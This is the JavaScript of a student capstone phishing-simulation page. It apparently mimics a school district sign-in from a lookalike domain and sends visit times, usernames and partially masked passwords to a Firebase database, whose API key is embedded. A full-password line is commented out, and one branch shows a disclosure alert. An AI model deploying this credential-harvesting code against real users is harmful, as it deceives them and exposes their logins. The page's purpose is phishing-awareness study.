
  // Initialize Firebase
  var config = {
    apiKey: "AIzaSyDW2N5DTqC2SQvRr0kWZOlYFiq5xgU08-8",
    authDomain: "campus-site.firebaseapp.com",
    databaseURL: "https://campus-site.firebaseio.com",
    projectId: "campus-site",
    storageBucket: "",
    messagingSenderId: "71367401718"
  };
  firebase.initializeApp(config);


//date variable so both use the same session id
function getDateStr(d)
{
	var monthStr = "" + (d.getMonth() + 1)
	if(monthStr.length == 1) monthStr = "0" + monthStr;
	var dayStr = "" + (d.getDate())
	if(dayStr.length == 1) dayStr = "0" + dayStr;
	var hrStr = "" + (d.getHours())
	if(hrStr.length == 1) hrStr = "0" + hrStr;
	var minStr = "" + (d.getMinutes())	
	if(minStr.length == 1) minStr = "0" + minStr;
	var secStr = "" + d.getSeconds()
	if(secStr.length == 1) secStr = "0" + secStr;
	var msStr = "" + (d.getMilliseconds())
	if(msStr.length == 1) msStr = "0" + msStr;

	return d.getFullYear() + '-' + monthStr + '-' + dayStr + ' ' + hrStr + ':' + minStr + ':' + secStr + '.' + msStr;
}

function getDateKey(d)
{
	var hrStr = "" + (d.getHours())
	if(hrStr.length == 1) hrStr = "0" + hrStr;
	var minStr = "" + (d.getMinutes())	
	if(minStr.length == 1) minStr = "0" + minStr;
	var secStr = "" + d.getSeconds()
	if(secStr.length == 1) secStr = "0" + secStr;
	var msStr = "" + (d.getMilliseconds())
	if(msStr.length == 1) msStr = "0" + msStr;

	return hrStr + '-' + minStr + '-' + secStr;
}

function getDay(d)
{
	var monthStr = "" + (d.getMonth() + 1)
	if(monthStr.length == 1) monthStr = "0" + monthStr;
	var dayStr = "" + (d.getDate())
	if(dayStr.length == 1) dayStr = "0" + dayStr;
	
	return monthStr + '-' + dayStr;
}

var dateOpened = new Date();

class siteVisit
{
	constructor(email)
	{	
		var data = {
			time: getDateStr(dateOpened),
    		email: email
 		};
 		
 		var updates = {};
  		//updates['/site-visits/' + email + '-' + monthStr + '-' + dayStr + '-' + hrStr + '-' + minStr + '-' + secStr] = data;

		updates['/sessions-date/' + getDay(dateOpened) + '/' + email + '-' + getDateKey(dateOpened) + '/open-site'] = data;

  		return firebase.database().ref().update(updates);
	}
}

class dbEntry
{
	constructor(email, user, pass)
	{
		this.email = email;
		if(user == null && pass == null)
		{
			this.user = "ACCIDENTAL ATTEMPT ";
			this.pass = " ";
			this.passHidden = " ";
		}
		else
		{
			this.user = user.value;
			this.pass = pass.value;
			this.passHidden = pass.value.substring(0, 1);
			for(var i=1; i<pass.value.length; i++)
				this.passHidden += '*';
		}
		
		this.sendData();
	}
	
	sendData()
	{	
		var data = {
			time: getDateStr(new Date()),
    		user: this.user,
    		passHidden: this.passHidden,
    		//pass: this.pass
 		};
 		
 		var updates = {};
  		//updates['/login-attempts/' + this.user + '-' + monthStr + '-' + dayStr + '-' + hrStr + '-' + minStr + '-' + secStr] = data;
  		
  		updates['/sessions-date/' + getDay(dateOpened) + '/' + this.email + '-' + getDateKey(dateOpened) + '/signin-attempt'] = data;

  		return firebase.database().ref().update(updates);
	}
}

//MY SIGNIN CODE

var getUrl = window.location.search.substring(1);
//$('#email')[0].value = getUrl.split("=")[1];
if(getUrl.length == 0) getUrl = "undefined";

$('#form_signin').on('submit', function() {
	if(getUrl == "undefined")
	{
		new dbEntry(getUrl, null, null);
		alert("Adam Walker's Senior Capstone Project: You have signed into a fake phishing site that COULD have logged your password (but didn't, you can check the code). This was intended to be sent through email as a test for a Senior Capstone project. You have stumbled across this site inadvertently. Please make sure to check that you are going to campus.ccsd.net instead of campusccsd.com. All that was stored from this session is the timestamp that you tried to sign in. Your username and password were not stored. You will now be signed on normally. Please contact Adam Walker at adamwalker567123@gmail.com if you have any questions. For code, see the github for this project: https://github.com/Rubiks-boy/Phishing-Capstone-Project");
	}
	else new dbEntry(getUrl, $('#username')[0], $('#password')[0]);
});

//log visit on db
new siteVisit(getUrl);